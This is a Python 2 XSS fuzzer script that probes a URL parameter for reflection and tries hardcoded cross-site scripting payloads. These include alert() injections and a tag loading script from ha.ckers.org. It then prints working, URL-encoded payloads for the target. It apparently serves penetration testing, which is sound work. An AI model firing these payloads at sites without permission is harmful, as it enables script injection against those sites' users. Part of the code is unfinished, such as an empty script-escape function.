#!/usr/bin/env python

"""
  Python XSS Fuzzer
  A python based fuzzer that attempts to determine whether XSS can exist given a parameter to fuzz.
  It determines the location of the parameter reflection, then intelligently fuzzes the parameter
  using most likely payloads first. It also checks if the payload can be injected cleanly (i.e. by
  not breaking code on the page), and if so, generates a full working payload.
  Copyright: Matthew Fuller, http://matthewdfuller.com
  Usage: python smartfuzz.py http://site.com/full-path-with-params?param=XSSHEREXSS
""" 
from urlparse import urlparse, parse_qs
from HTMLParser import HTMLParser
import urllib
import urllib2
import sys
import re

#######################################################################################################################
#GLOBAL VARIABLES
#######################################################################################################################
XSSCHECKVAL = "XSSHEREXSS"      #Must be plaintext word unlikely to appear on the page
URL = ""
NUM_REFLECTIONS = 0             #Number of times the parameter value is displayed in the code.

CURRENTLY_OPEN_TAGS = []        #Currently open is modified as the html is parsed
OPEN_TAGS = []                  #Open is saved once xsscheckval is found
OPEN_EMPTY_TAG = ""
TAGS_TO_IGNORE = ['html','body','br']       #These tags are normally empty <br/> or should be ignored because don't need to close them but sometimes, not coded properly <br> and missed by the parser.
TAG_WHITELIST = ['input', 'textarea']             #Tags to break out of specifically

OCCURENCE_NUM = 0
OCCURENCE_PARSED = 0
LIST_OF_PAYLOADS = []

#######################################################################################################################
#GLOBAL FUZZING LISTS
#######################################################################################################################

FUZZING_PAYLOADS_BASE = [
    "<script>alert(1)</script>",
    "<sCriPt>alert(1);</sCriPt>",
    "<script src=http://ha.ckers.org/xss.js></script>",
    "<script>alert(String.fromCharCode(88,83,83));</script>",
    "<IMG \"\"\"><script>alert(\"XSS\")</script>\">",
    "<img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>"
]

FUZZING_PAYLOADS_START_END_TAG = [
    "\"/><script>alert(1)</script>",
    "\"\/><img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>",
    "\"\/><img src=\"blahjpg\" onerror=\"alert('XSS')\"/>"      #Removed period
]

FUZZING_PAYLOADS_ATTR = [
    "\"><script>alert(1)</script>",
    "\"><img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>",
    "'><script>alert(1)</script>"
]

#######################################################################################################################
# MAIN FUNCTION
#######################################################################################################################
def main():    
    #COMMAND LINE PARSING ARGUMENTS
    if (len(sys.argv) != 2 or XSSCHECKVAL not in sys.argv[1]):
        exit("Usage: python smartfuzz.py <FULL URL REPLACING PARAM TO FUZZ WITH " + XSSCHECKVAL + ">\nExample: python smartfuzz.py http://site.com/?param=" + XSSCHECKVAL + "\n")
    global URL
    URL = sys.argv[1]

    print "\nProvided URL: " + URL
    
    #LOAD THE PROVIDED PAGE TO SEE IF VALID URL, CATCH ALL NON-SUCCESS RESPONSE CODES
    print "\n[Can URL be loaded?]"
    init_resp = make_request(URL)   #Function will exit with error if fails.
    print bcolors.OKGREEN + "SUCCESS." + bcolors.ENDC
    
    #IF VALID URL, CHECK FOR REFLECTED CHECK VAL IN RESPONSE
    print "\n[Does response contain the parameter value?]"
    if(XSSCHECKVAL.lower() in init_resp.lower()):
        #PRINT NUM LINES CONTAINING RESPONSE
        global NUM_REFLECTIONS
        NUM_REFLECTIONS = init_resp.lower().count(XSSCHECKVAL.lower())
        print bcolors.OKGREEN + "SUCCESS." + bcolors.ENDC + " Reflected in code " + str(NUM_REFLECTIONS) + " time(s)."
        
    else:
        exit(bcolors.FAIL + "ERROR." + bcolors.ENDC + " Check value not in response. Nothing to test. Exiting...\n")
    
    #Loop through and run tests for each occurence
    for i in range(NUM_REFLECTIONS):
        print "\n\nTESTING OCCURENCE NUMBER: " + str(i + 1)
        global OCCURENCE_NUM
        OCCURENCE_NUM = i+1
        scan_occurence(init_resp)
        #Reset globals for next instance
        global ALLOWED_CHARS, IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG, CURRENTLY_OPEN_TAGS, OPEN_TAGS, OCCURENCE_PARSED, OPEN_EMPTY_TAG
        ALLOWED_CHARS, CURRENTLY_OPEN_TAGS, OPEN_TAGS = [], [], []
        IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG = False, False, False, False, False
        OCCURENCE_PARSED = 0
        OPEN_EMPTY_TAG = ""
    
    print "\n\nScan complete. Full list of possible payloads:"
    for payload in LIST_OF_PAYLOADS:
        print payload
    
#######################################################################################################################
# OTHER FUNCTIONS
#######################################################################################################################
#scan_occurence() runs scan for a reflected instance (a param can be used multiple times on a page)
def scan_occurence(init_resp):
    #Begin parsing HTML tags to see where located
    print "\n[Checking for location of xsscheckval.]"
    location = html_parse(init_resp)
    if(location == "comment"):
        print "Found in an HTML comment."
        break_comment()
    elif(location == "script_data"):
        print "Found as data in a script tag."
        break_script()
    elif(location == "html_data"):
        print "Found as data or plaintext on the page."
        break_data()
    elif(location == "start_end_tag_attr"):
        print "Found as an attribute in an empty tag."
        break_start_end_attr()
    elif(location == "attr"):
        print "Found as an attribute in an HTML tag."
        break_attr()

#html_parse() locates the xsscheckval and determins where it is in the HTML
def html_parse(init_resp):
    parser = MyHTMLParser()
    location = ""
    try:
        parser.feed(init_resp)
    except Exception as e:
        location = str(e)
    except:
        print bcolors.FAIL + "ERROR." + bcolors.ENDC + " That was bad. Some sort of parsing error happened. Try rerunning?"
    return location

#test_param_check() simply checks to see if the provided string exists in the response occurence
#param_to_check is the parameter to insert in the request
#param_to_compare is the parameter to look for in the response
#Allows checking for characters that may be encoded differently. For example, check < but compare %3C
def test_param_check(param_to_check, param_to_compare):
    check_string = "XSSSTART" + param_to_check + "XSSEND"
    compare_string = "XSSSTART" + param_to_compare + "XSSEND"
    check_url = URL.replace(XSSCHECKVAL, check_string)
    try:
        check_response = make_request(check_url)
    except:
        check_response = ""
    success = False
    
    #Loop to get to right occurence
    occurence_counter = 0
    for m in re.finditer('XSSSTART', check_response, re.IGNORECASE):
        occurence_counter += 1
        if((occurence_counter == OCCURENCE_NUM) and (check_response[m.start():m.start()+len(compare_string)].lower() == compare_string.lower())):
            success = True
            break
    return success

#make_request() makes a URL request given a provided URL and returns the response
def make_request(in_url):
    try:
        req = urllib2.Request(in_url)
        resp = urllib2.urlopen(req)
        return resp.read()
    except:
        print "\n" + bcolors.FAIL + "ERROR" + bcolors.ENDC + " Could not open URL. Exiting...\n"

#BREAK OUT FUNCTIONS - used to break out of code and determine xss
def break_comment():
    print "\n[Can comment be escaped to execute XSS?]"
    payload = "--><script>alert(1);</script>"
    #Try the full payload first, if it doesn't work, start testing individual alternatives
    if(test_param_check(payload,payload)):
        payload = "--><script>alert(1);</script>"
        if(test_param_check(payload + "<!--",payload+"<!--")):
            #Try a clean payload
            payload = "--><script>alert(1);</script><!--"
    else:
        # best case payload didn't work for some reason, find out why
        if(test_param_check("-->", "-->")):
            #--> is allowed so begin directed fuzzing. Most likely payloads first. See if it can be done cleanly by appending <!--
            clean = test_param_check("<!--", "<!--")
            found = False
            for pl in FUZZING_PAYLOADS_BASE:
                pl = "-->" + pl
                if(clean):
                    pl = pl + "<!--"
                #print "Trying payload: " + pl
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
            if(not found):
                print bcolors.FAIL + "ERROR." + bcolors.ENDC + " After trying all fuzzing attacks, none were successful. Check manually to confirm."
        else:
            # --> not allowed
            payload = ""
            print bcolors.FAIL + "ERROR." + bcolors.ENDC + " Cannot escape comment because the --> string needed to close the comment is escaped."
            
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print bcolors.OKGREEN + "SUCCESS." + bcolors.ENDC + " Parameter was reflected in a comment. Use the following payload to break out:"
        print payload
        print "Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))

def break_script():
    print "\n[Can script be escaped to execute XSS?]"
    
def break_data():
    print "\n[Can script be injected as plaintext to execute XSS?]"
    payload = "<script>alert(1);</script>"
    #Check for odd data locations such as in textbox
    if("textarea" in CURRENTLY_OPEN_TAGS):
        payload = "</textarea>" + payload
    if("title" in CURRENTLY_OPEN_TAGS):
        payload = "</title>" + payload
    if(test_param_check(payload,payload)):
        payload = payload
    else:
        #best case payload didn't work
        found = False
        for pl in FUZZING_PAYLOADS_BASE:
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
        if(not found):
            payload = ""
            print bcolors.FAIL + "ERROR." + bcolors.ENDC + " After trying all fuzzing attacks, none were successful. Check manually to confirm."

    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print bcolors.OKGREEN + "SUCCESS." + bcolors.ENDC + " Parameter was reflected in data or plaintext. Use the following payload to break out:"
        print payload
        print "Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))

def break_start_end_attr():
    print "\n[Can tag attribute be escaped to execute XSS?]"
    payload = "\"/><script>alert(1);</script>"
    if(test_param_check(payload,payload)):
        payload = "\"/><script>alert(1);</script>"
        # %20 is used in the function below to indicate a space, the return value would be a reflected space not %20 literally
        if(test_param_check(payload+"<br%20attr=\"", payload+"<br attr=\"")):
            #Try a clean payload
            payload = "\"/><script>alert(1);</script><br attr=\""
    else:
        # best case payload didn't work for some reason, find out why
        if(test_param_check("/>", "/>")):
            #--> is allowed so begin directed fuzzing. Most likely payloads first. See if it can be done cleanly by appending <!--
            clean = test_param_check("<br%20attr=\"", "<br attr=\"")
            found = False
            for pl in FUZZING_PAYLOADS_START_END_TAG:
                if(clean):
                    pl = pl + "<br attr=\""
                #print "Trying payload: " + pl
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print bcolors.FAIL + "ERROR." + bcolors.ENDC + " After trying all fuzzing attacks, none were successful. Check manually to confirm."
        else:
            # /> not allowed, trying a few alternatives. Resorting to invalid html.
            print bcolors.WARNING + "WARNING." + bcolors.ENDC + " /> cannot be used to end the empty tag. Resorting to invalid HTML."
            payloads_invalid = [
                "\"></" + OPEN_EMPTY_TAG + "><script>alert(1);</script>",
                "\"<div><script>alert(1);</script>"
                ]
            found = False
            for pl in payloads_invalid:
                #print pl
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print bcolors.FAIL + "ERROR." + bcolors.ENDC + " Cannot escape out of the attribute tag using all fuzzing payloads. Check manually to confirm."
            
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):    #avoid duplicates
            LIST_OF_PAYLOADS.append(payload)
        print bcolors.OKGREEN + "SUCCESS." + bcolors.ENDC + " Parameter was reflected in an attribute of an empty tag. Use the following payload to break out:"
        print payload
        print "Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))

def break_attr():
    print "\n[Can tag attribute be escaped to execute XSS?]"
    payload = "\"></" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "><script>alert(1);</script>"
    if(test_param_check(payload,payload)):
        if(test_param_check(payload + "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "%20attr=\"", payload + "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\"")):
            #Try a clean payload
            payload = "\"></" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "><script>alert(1);</script><" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\""
    #Ideal payload didn't work, find out why
    else:
        #Try ">
        if(test_param_check("\">", "\">")):
            # "> is allowed so begin directed fuzzing. Most likely payloads first. See if it can be done cleanly by appending <!--
            clean_str = "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\""
            clean = test_param_check("<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "%20attr=\"", clean_str)
            found = False
            for pl in FUZZING_PAYLOADS_ATTR:
                if(clean):
                    pl = pl + clean_str
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print bcolors.FAIL + "ERROR." + bcolors.ENDC + " After trying all fuzzing attacks, none were successful. Check manually to confirm."
        else:
            # "> isn't allowed
            print bcolors.WARNING + "WARNING." + bcolors.ENDC + " \"> cannot be used to end the empty tag. Resorting to invalid HTML."
            payloads_invalid = [
                "\"<div><script>alert(1);</script>",
                "\"</script><script>alert(1);</script>",
                "\"</><script>alert(1);</script>",
                "\"</><script>alert(1)</script>",
                "\"<><img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>",
                ]
            found = False
            for pl in payloads_invalid:
                #print pl
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print bcolors.FAIL + "ERROR." + bcolors.ENDC + " Cannot escape out of the attribute tag using all fuzzing payloads. Check manually to confirm."
            
    
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):    #avoid duplicates
            LIST_OF_PAYLOADS.append(payload)
        print bcolors.OKGREEN + "SUCCESS." + bcolors.ENDC + " Parameter was reflected in an attribute of an HTML tag. Use the following payload to break out:"
        print payload
        print "Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))
        
#######################################################################################################################
# CLASSES
#######################################################################################################################

#HTML Parser class
class MyHTMLParser(HTMLParser):
    def handle_comment(self, data):
        global OCCURENCE_PARSED
        if(XSSCHECKVAL.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                raise Exception("comment")
    
    def handle_startendtag(self, tag, attrs):
        global OCCURENCE_PARSED
        global OCCURENCE_NUM
        global OPEN_EMPTY_TAG
        if (XSSCHECKVAL.lower() in str(attrs).lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                OPEN_EMPTY_TAG = tag
                raise Exception("start_end_tag_attr")
            
    def handle_starttag(self, tag, attrs):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        #print CURRENTLY_OPEN_TAGS
        if(tag not in TAGS_TO_IGNORE):
            CURRENTLY_OPEN_TAGS.append(tag)
        if (XSSCHECKVAL.lower() in str(attrs).lower()):
            if(tag == "script"):
                OCCURENCE_PARSED += 1
                if(OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("script")
            else:
                OCCURENCE_PARSED += 1
                if(OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("attr")

    def handle_endtag(self, tag):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if(tag not in TAGS_TO_IGNORE):
            CURRENTLY_OPEN_TAGS.remove(tag)
            
    def handle_data(self, data):
        global OCCURENCE_PARSED
        if (XSSCHECKVAL.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                #If last opened tag is a script, send back script_data
                if(CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS)-1] == "script"):
                    raise Exception("script_data")
                else:
                    raise Exception("html_data")

#SET COLORS
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

    def disable(self):
        self.HEADER = ''
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.WARNING = ''
        self.FAIL = ''
        self.ENDC = ''

#RUN MAIN FUNCTION
if __name__ == "__main__":
    main()